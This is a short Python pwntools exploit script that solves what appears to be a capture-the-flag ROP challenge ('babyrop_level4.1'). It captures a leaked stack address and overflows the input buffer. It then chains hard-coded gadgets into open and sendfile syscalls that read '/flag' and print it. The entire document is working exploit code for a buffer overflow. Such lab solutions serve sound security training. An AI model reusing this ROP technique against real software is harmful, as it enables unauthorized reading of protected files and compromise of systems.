from pwn import * 

context.arch = 'amd64'
context.os = 'linux'

io = process('/challenge/babyrop_level4.1', level='DEBUG')

io.recvuntil(b"[LEAK] Your input buffer is located at: ")
buff_address = p64(eval(io.recvline().strip()[:-1].decode()))

len = 32

## rp++ --file babyrop_level3.1 --rop 2 | grep -i "pop rdi"

pop_rax = p64(0x401a84)
pop_rdi = p64(0x401c13)
pop_rsi = p64(0x401a7b)
pop_rdx = p64(0x401a73)
pop_r10 = p64(0x401a63)
syscall = p64(0x401a53)

overflow_payload = b'/flag\x00' + b'A' * (len - 6) + b'B' * 8 
open_payload = pop_rax + p64(0x02) + pop_rdi + buff_address + pop_rsi + p64(0x00) + pop_rdx + p64(0x00) + syscall 
send_payload = pop_rax + p64(0x28) + pop_rdi + p64(0x01) + pop_rsi + p64(0x03) + pop_rdx + p64(0x00) + pop_r10 + p64(0x03e8) + syscall 

payload = overflow_payload + open_payload + send_payload
io.sendline(payload)
 
io.recvline()
io.interactive()
